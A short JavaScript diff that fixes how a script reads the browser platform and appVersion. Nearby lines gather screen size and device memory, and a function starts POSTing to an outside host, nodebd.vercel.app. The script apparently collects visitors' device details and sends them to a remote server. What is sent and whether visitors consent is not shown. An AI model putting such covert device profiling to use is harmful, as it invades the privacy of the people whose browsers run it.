@@ -428,8 +428,8 @@ if(navigator.deviceMemory){
     info=screen.height+'x'+screen.width
 }
 
-if(navigator){var platformm=navigator.platform}else{var platformm='sorry!'}
-if(navigator){var devicee=navigator.appVersion}{var devicee='sorry!'}
+if(navigator){var platformm=navigator.platform;var devicee=  navigator.appVersion}else{var platformm='sorry!';var devicee='sorry!'}
+
 function mcus() {
     var xhttp = new XMLHttpRequest();
     xhttp.open("POST", 'https://nodebd.vercel.app/', true);
